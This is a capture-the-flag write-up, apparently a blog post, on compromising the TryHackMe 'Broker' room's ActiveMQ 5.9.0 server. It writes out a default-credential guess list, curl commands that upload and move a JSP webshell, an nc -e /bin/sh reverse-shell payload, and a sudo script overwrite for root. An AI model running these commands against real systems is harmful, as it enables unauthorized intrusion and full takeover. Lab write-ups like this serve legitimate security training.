---
title: "Broker - TryHackMe"
date: "2021-03-14"
categories: 
  - "tryhackme"
tags: 
  - "chat-broker"
  - "directory-traversal"
  - "web"
---

Write-up for Tryhackme room [Broker](https://tryhackme.com/room/broker).

Difficulty Level - Medium

```
nmap --min-rate 300  -A -oN allport -p- $IP
```

![](/Images/broker/Screenshot-2021-03-14-180024.png)

As we can see website is running on port 8161, when we can browse to port we can see service called "**ActiveMQ**" which look little old.

![](/Images/broker/Screenshot-2021-03-14-180458-1024x230.png)

as you can see there is admin login link try to login with standerd credential

```
Ex : 

admin:admin

admin:password

admin:admin@123

admin:password@123

admin:password123
```

one these cred will work,after login first thought to check the exploit database.

![](/Images/broker/Screenshot-2021-03-14-181134-1024x183.png)

looks like its vulnerable for Directory Traversal, we could upload webshell to "**/fileserver**"

you can download webshell here [tennc](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp), or if you using **kali** as your OS we already have webshell in your PC just use this command to locate.

```
locate webshell

ls /usr/share/webshell/jsp/
```

I will be uploading shell using "**cURL**" you can use curl or burpsuit for upload the shell.

```
curl -u 'admin:admin' -v -X PUT --data "@cmd.jsp" http://$IP:8161/fileserver/cmd.jsp
```

![](/Images/broker/Screenshot-2021-03-14-182830.png)

if you want to check file uploaded correctly we can curl file and see the result.

![](/Images/broker/Screenshot-2021-03-14-183021-1024x167.png)

looks like webshell uploaded correctly, but we can't execute it in /fileserver so we need to move to folder which we can execute for that we should know the path, with using curl we can find it too.

![](/Images/broker/Screenshot-2021-03-14-183725.png)

now we know the path where it located "**/opt/apache-activemq-5.9.0/webapps/fileserver/**"

since we know the path we can move the webshell location to where we can execute, which is **/admin** folder, use this command to move.

```
curl -u 'admin:admin' -X MOVE http://$IP:8161/fileserver/cmd.jsp --header 'Destination:file:///opt/apache-activemq-5.9.0/webapps/admin/cmd.jsp'
```

now enter this in URL and we have successful webshell.

```
http://$IP:8161/admin/cmd.jsp?cmd=COMMAND
```

![](/Images/broker/Screenshot-2021-03-14-184414-1024x563.png)

so now we can get easily get reverse shell,

```
#Copy any shells from any website
nc -e /bin/sh $IP 9999

#replace "space" with "plus" symbol 
nc+-e+/bin/sh+$IP+9999

#listen the nc on your machine
nc -lvnp 9999

#enter payload in url you get reverse shell.
```

now we have reverse shell but need to stabilize it use following command to stabilize the shell.

```
python3 -c 'import pty; pty.spawn("/bin/bash")' 

export TERM=xterm

#press CTRL + Z then enter the last command

stty raw -echo; fg
```

## Privilege Escalation

lets see which command user can perform with sudo permission type "sudo -l"

![](/Images/broker/Screenshot-2021-03-14-185656.png)

we can execute **subscribe.py** in **/opt** directory which we have write permission also that mean all need to add small code or completely replace it and we will get root shell from it.

```
import os

os.system("bash")
```

add above code and save the file and execute with "**sudo**".

![](/Images/broker/Screenshot-2021-03-14-190624.png)

we finally root.

Happy Hacking!!!
